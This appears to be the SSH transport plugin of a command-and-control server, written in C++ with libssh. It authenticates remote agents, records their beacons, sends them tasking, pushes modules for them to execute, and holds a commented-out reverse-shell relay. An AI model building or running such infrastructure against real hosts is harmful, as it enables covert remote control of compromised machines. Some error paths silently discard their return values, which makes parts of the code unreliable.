#include "ssh_transport.h"

// server required defines 
int type = 99; // type TRANSPORT
char *name = "SSH Backend";
int id = 55;



const int default_port = 22;

//#define API_RETURN(e,d) ( api_return { e , (void*)d } )

typedef struct _dat_str {
    clientDat data;
    int portno;
    ssh_bind sshbind;
    ssh_session session;
    ssh_channel channel;
} data_struct, pdata_struct;


transport_t transport_api = {
    send_ok, send_err, listen, read, write,
    upload_file, init_reverse_shell, 
    determine_handler, get_dat_siz, init, end, 
    get_name, get_id, set_port, get_agent_name
};

api_return init(void* instance_struct)
{
    return api_return{API_OK, nullptr};
}

api_return end(void* instance_struct)
{
    data_struct *dat_structure = (data_struct*)instance_struct;
    
    ssh_bind_free(dat_structure->sshbind);
    ssh_finalize();
    return api_return{API_OK, nullptr};
}

const char *get_name(){
    return name;
}

int get_id(){
    return id;
}

api_return get_dat_siz(){
    return api_return{API_OK, (void*)sizeof(data_struct)};
}

api_return determine_handler(void* instance_struct){
    data_struct *dat_structure = (data_struct*)instance_struct;

    ssh_message message;
    int rc = 0;
    int msgType = REQ_NONE;
    char buf[4096];
    char beacon[BUFSIZ];
    char tmp_buffer[3];
    char *tasking;
    char logbuff[BUFSIZ];
    memset(logbuff, 0, sizeof(logbuff));
    memset(tmp_buffer, 0, 3);
    
    do {
		//printf("entered message loop\n");
        message = ssh_message_get(dat_structure->session);
        if(message){
            switch(ssh_message_type(message)){
                case SSH_REQUEST_CHANNEL_OPEN:
                    if(ssh_message_subtype(message)==SSH_CHANNEL_SESSION){
                        dat_structure->channel=ssh_message_channel_request_open_reply_accept(message);
                        break;
                    }
                default:
                    ssh_message_reply_default(message);
            }
            ssh_message_free(message);
        }
    } while(message && !dat_structure->channel);
    
	if(!dat_structure->channel){
        printf("Channel error : %s\n", ssh_get_error(dat_structure->session));
        ssh_finalize();
        return api_return{API_ERR_GENERIC, (void *)ssh_get_error(dat_structure->session)};
    }
    
	do {
        message=ssh_message_get(dat_structure->session);
        if(message && ssh_message_type(message)==SSH_REQUEST_CHANNEL &&
           ssh_message_subtype(message)==SSH_CHANNEL_REQUEST_SHELL){
				msgType = REQ_TASKING;
                ssh_message_channel_request_reply_success(message);
                break;
        }
        ssh_message_free(message);
    } while (message);
    
    
    switch (msgType)
    {
    case REQ_TASKING:
        ssh_channel_read(dat_structure->channel, tmp_buffer, 2, 0);
            
        if(tmp_buffer[0] == '9'){
            ssh_channel_write(dat_structure->channel, "ok", 2);
            return api_return{API_OK, (void *)MANAG_TYPE};

        } else {
            // Check if ID exists
            memset(buf, 0, sizeof(buf));
            strcat(buf, "agents/");
            int exists = misc_directory_exists(strcat(buf, dat_structure->data.id));
        
            if(!exists){
                AgentInformationHandler::init(dat_structure->data.id);
                printf("Client %s: Initialized agent\n", dat_structure->data.id);
            }
            rc = ssh_channel_write(dat_structure->channel, "ok", 3);
            if(rc == SSH_ERROR){
                printf("Client %s: caught ssh error: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
                api_return{API_ERR_GENERIC, (void*)ssh_get_error(dat_structure->session)};
            }

            rc = ssh_channel_read(dat_structure->channel, beacon, sizeof(beacon), 0);
            if(rc == SSH_ERROR){
                printf("Client %s: caught ssh error: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
                api_return{API_ERR_GENERIC, (void *) ssh_get_error(dat_structure->session)};
            }
            AgentInformationHandler::write_beacon(dat_structure->data.id, beacon);

            tasking = AgentInformationHandler::get_tasking(dat_structure->data.id);
            if(!tasking){
                printf("Client %s: caught ssh error: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
                perror("Reason");
                api_return{API_ERR_GENERIC, (void *) ssh_get_error(dat_structure->session)};
            }
            
            // Write tasking
            rc = ssh_channel_write(dat_structure->channel, tasking, strlen(tasking));
            if(rc == SSH_ERROR){
                printf("Client %s: Failed to write to channel: %s", dat_structure->data.id, ssh_get_error(dat_structure->session));
                api_return{API_ERR_READ, (void *) ssh_get_error(dat_structure->session)};
                
            }
            // Pass to handler
            return api_return{API_OK, (void*) AGENT_TYPE};
        
        }
        
        break;
    default:
        printf("Client %s: got unknown message type: %d\n", dat_structure->data.id, msgType);
        api_return{API_ERR_CLIENT, (void*)ssh_get_error(dat_structure->session)};
    }

    printf("Closing channels...\n");
    ssh_message_free(message);
    ssh_finalize();
	
    return api_return{API_ERR_GENERIC, nullptr};
}

/*Uploads a file to some connected entity*/
api_return upload_file(void* instance_struct, const char *ptr, int is_module){
    data_struct *dat_structure = (data_struct*)instance_struct;


    char buff[BUFSIZ];
    char directory[BUFSIZ];
    char logbuff[BUFSIZ];
    char tmpbuffer[8];
    char *file_data;
    char *enc_data;
    int size = 0;
    int size_e = 0;
    int rc = 0;

    
    memset(buff, 0, sizeof(buff));
    memset(directory, 0, sizeof(directory));
    memset(tmpbuffer, 0, sizeof(tmpbuffer));
    memset(logbuff, 0, sizeof(logbuff));
    printf("Client %s: Sending file -> %s\n", dat_structure->data.id, ptr);
    
    // get filesize 
    snprintf(buff,8000, "%s/%s", getcwd(directory, sizeof(directory)), ptr);
    size = misc_get_file(buff, &file_data);
        
    if(size < 0){
        printf("Client %s: filename '%s' does not exist\n", dat_structure->data.id, buff);
    
        rc = ssh_channel_write(dat_structure->channel, "er", 3);
        if(rc == SSH_ERROR){
            printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
            return api_return{API_ERR_WRITE, (void*) ssh_get_error(dat_structure->session)};
        }
        return api_return{API_ERR_LOCAL, (void*)"File not found"};
    }
    
    size_e = B64::enc_size(size);
    sprintf(tmpbuffer, "%d", size_e);
        
    // writes file size
    rc = ssh_channel_write(dat_structure->channel, tmpbuffer, sizeof(tmpbuffer));
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
        return api_return{API_ERR_WRITE, (void*) ssh_get_error(dat_structure->session)};
    }
    
    rc = ssh_channel_read(dat_structure->channel, buff, sizeof(buff), 0);
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to read data from channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
        return api_return{API_ERR_READ, (void*) ssh_get_error(dat_structure->session)};
    }
        
     B64::encode((unsigned char *)file_data, size, &enc_data);
        
    // writes file 
    rc = ssh_channel_write(dat_structure->channel, enc_data, size_e);
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to write data to channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
        return api_return{API_ERR_WRITE, (void*) ssh_get_error(dat_structure->session)};
    }
    memset(tmpbuffer, 0, 8);
    
    rc = ssh_channel_read(dat_structure->channel, tmpbuffer, 8, 0);
    if(rc == SSH_ERROR){
        printf("Client %s: Failed to read data from channel: %s\n", dat_structure->data.id, ssh_get_error(dat_structure->session));
        return api_return{API_ERR_READ, (void*) ssh_get_error(dat_structure->session)};
    }

    
    if(is_module){
        printf("Client %s: Execution of module ended with exit code %s\n", dat_structure->data.id, tmpbuffer);
    }
    free(file_data);
    free(enc_data);

    return api_return{API_OK, nullptr};
}

api_return init_reverse_shell(void* instance_struct){
    data_struct dat_structure = *(data_struct*)instance_struct;

    /*class Server *srv = instance->get_server();
    std::queue<ConnectionInstance *> dequ;
    ConnectionInstance *inst = nullptr;
    int sz = 0;
    int rc = 0;
    int found = 0;
    int quitting = 0;
    char *recvbuff = (char *)malloc(BUFSIZ);
    memset(recvbuff, 0, BUFSIZ);

    while(!found){
        sz = srv->get_shell_queue()->size();
        for(int i = 0; i< sz; i++){
            inst = srv->get_shell_queue()->front();
            if(strncmp(id,inst->get_data()->id, strlen(id))){
                found = 1;
                srv->get_shell_queue()->pop();
                break;
            } else {
                srv->get_shell_queue()->push(instance);
                srv->get_shell_queue()->pop();
            }
        }
        sleep(0.5);
    }

    class ServerTransport *remote = inst->get_transport();

    while(!quitting){
        memset(recvbuff, 0, BUFSIZ);
        rc = read(&recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }

        memset(recvbuff, 0, BUFSIZ);
        rc = remote->write(recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }

        memset(recvbuff, 0, BUFSIZ);
        rc = remote->read(&recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }

        memset(recvbuff, 0, BUFSIZ);
        rc = write(recvbuff, BUFSIZ);
        if(rc != 0){
            char logbuff[BUFSIZ];
            memset(logbuff, 0, sizeof(logbuff));
        
            printf("Shell %s->%s: Failed to handle shell: %s\n", data->id, remote->get_data()->id, ssh_get_error(session));
            inst->shell_finish();
            return 1;
        }
    }#0  Server::handle_instance (server=0x555555580730, handle=0x555555589c90, reload=true) at serverSrc/server.cpp:209

    inst->shell_finish();*/
    return api_return{API_ERR_WRITE, nullptr};
}

api_return listen(void* instance_struct){
    data_struct *dat_structure = (data_struct*)instance_struct;

    printf("[Listen] Address %p->%p\n", instance_struct, dat_structure);


    int r;

    int sock = socket(AF_INET , SOCK_STREAM , 0);
    
    dat_structure->sshbind=ssh_bind_new();
    dat_structure->session=ssh_new();

    ssh_options_set(dat_structure->session, SSH_OPTIONS_FD, &sock);
	
    ssh_bind_options_set(dat_structure->sshbind, SSH_BIND_OPTIONS_DSAKEY, KEYS_FOLDER "ssh_host_dsa_key");
    ssh_bind_options_set(dat_structure->sshbind, SSH_BIND_OPTIONS_RSAKEY, KEYS_FOLDER "ssh_host_rsa_key");
    printf("Binding to portno %d...\n", dat_structure->portno);
    ssh_bind_options_set(dat_structure->sshbind, SSH_BIND_OPTIONS_BINDPORT, &(dat_structure->portno));

    if(ssh_bind_listen(dat_structure->sshbind)<0){
        printf("Error listening to socket: %s\n", ssh_get_error(dat_structure->sshbind));
        return api_return{API_ERR_LISTEN, (void*) ssh_get_error(dat_structure->sshbind)};
    }

    // bind the listener to the port
    printf("Server: Bound to listening port\n");

    r=ssh_bind_accept(dat_structure->sshbind, dat_structure->session);
    printf("Server: Accepting connection\n");
    if(r==SSH_ERROR){
      	printf("Error accepting a connection : %s\n",ssh_get_error(dat_structure->sshbind));
        return api_return{API_ERR_ACCEPT, (void*) ssh_get_error(dat_structure->sshbind)};
    }
    if (ssh_handle_key_exchange(dat_structure->session)) {
        printf("ssh_handle_key_exchange: %s\n", ssh_get_error(dat_structure->session));
        return api_return{API_ERR_AUTH, (void*) ssh_get_error(dat_structure->sshbind)};
    }

    api_return rc = authenticate(&instance_struct);
    if (rc.error_code != API_OK)
    {
        printf("Initialization: Failed to authenticate agent\n");
        return api_return{API_ERR_AUTH, (void*) "Bad authentication"};
    }
    return api_return{API_OK, nullptr};

}


api_return authenticate(void** instance_struct){
    data_struct *dat_structure = *(data_struct**)instance_struct;

    // initialize variables
    int auth=0;
    ssh_message message;
    
    do {
        message=ssh_message_get(dat_structure->session);
        if(!message)
            break;
        switch(ssh_message_type(message)){
            case SSH_REQUEST_AUTH:
                switch(ssh_message_subtype(message)){
                    // authenticate connection
                    case SSH_AUTH_METHOD_PASSWORD:
                        if(Authenticate::doauth(ssh_message_auth_user(message), ssh_message_auth_password(message))){
                            auth=1;
                            
                            // TODO: FIX TF OUT OF THIS
                            //name = (char*)malloc(strlen(ssh_message_auth_user(message)));
                        
                            if(dat_structure->data.id == NULL){
                                printf("all the way down...\n");
                            }
                            memset(dat_structure->data.id, 0, sizeof(dat_structure->data.id));//strlen(ssh_message_auth_user(message)));
                            snprintf(dat_structure->data.id, sizeof(dat_structure->data.id), "%s", ssh_message_auth_user(message));
                            ssh_message_auth_reply_success(message,0);
                            break;
                       	} else {
                            auth = 2;
                            ssh_message_reply_default(message);
                            break;
                        }
                    // not authenticated, send default message
                    case SSH_AUTH_METHOD_NONE:
                    default:
                        ssh_message_auth_set_methods(message,SSH_AUTH_METHOD_PASSWORD);
                        ssh_message_reply_default(message);
                        break;
                }
                break;
            default:
                ssh_message_reply_default(message);
        }
        ssh_message_free(message);
    } while (!auth);
    
    // Check if the client authenticated successfully
	if(auth != 1){
        printf("Server: Terminating connection\n");
        ssh_disconnect(dat_structure->session);
        return api_return{API_OK, (void*) 1};
    } else {
        return api_return{API_OK, (void*) 0};
    }
    return api_return{API_ERR_GENERIC, (void*) "Unreachable"};
}

api_return read(void* instance_struct, char **buff, int length){
    data_struct *dat_structure = (data_struct*)instance_struct;

    int rc = 0;
    rc = ssh_channel_read(dat_structure->channel, *buff, length, 0);
    if (rc == SSH_ERROR)
    {
        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
        return api_return{API_ERR_READ, (void*) ssh_get_error(dat_structure->session)};
    }
    return api_return{API_OK, (void*) rc};
        
}

api_return write(void* instance_struct, const char *buff, int length){
    data_struct *dat_structure = (data_struct*)instance_struct;

    int rc = 0;
    rc = ssh_channel_write(dat_structure->channel, buff, length);
    if(rc == SSH_ERROR){
        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
        return api_return{API_ERR_WRITE, (void*) ssh_get_error(dat_structure->session)};
    }
    return api_return{API_OK, (void*) rc};
}

api_return send_err(void* instance_struct){
    data_struct *dat_structure = (data_struct*)instance_struct;

    int rc = 0;
    rc = ssh_channel_write(dat_structure->channel, "er", 3);
    if (rc == SSH_ERROR)
    {
        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
        return api_return{API_ERR_WRITE, (void*) ssh_get_error(dat_structure->session)};
    }
    return api_return{API_OK, nullptr};
}

api_return send_ok(void* instance_struct){
    data_struct *dat_structure = (data_struct*)instance_struct;

    int rc = 0;
    rc = ssh_channel_write(dat_structure->channel, "ok", 3);
    if (rc == SSH_ERROR)
    {
        printf("Failed to handle agent: %s\n", ssh_get_error(dat_structure->session));
        return api_return{API_ERR_WRITE, (void*) ssh_get_error(dat_structure->session)};
    }
    return api_return{API_OK, nullptr};
}

api_return set_port(void* instance_struct, int portno){
    data_struct *dat_structure = (data_struct*)instance_struct;
    printf("Address %p->%p\n", instance_struct, dat_structure);

    fflush(stdout);

    printf("received port number %d\n", portno);
    if(portno == 0){
        printf("Portno was zero, like it should be...\n");
        dat_structure->portno = default_port;
    } else {
        dat_structure->portno = portno;
    }

    printf("Current port setting: %d\n", dat_structure->portno);

    return api_return{API_OK, nullptr};
}

api_return get_agent_name(void* instance_struct){
    api_return ret;
    data_struct *dat_structure = (data_struct*)instance_struct;

    return api_return{API_OK, dat_structure->data.id};
}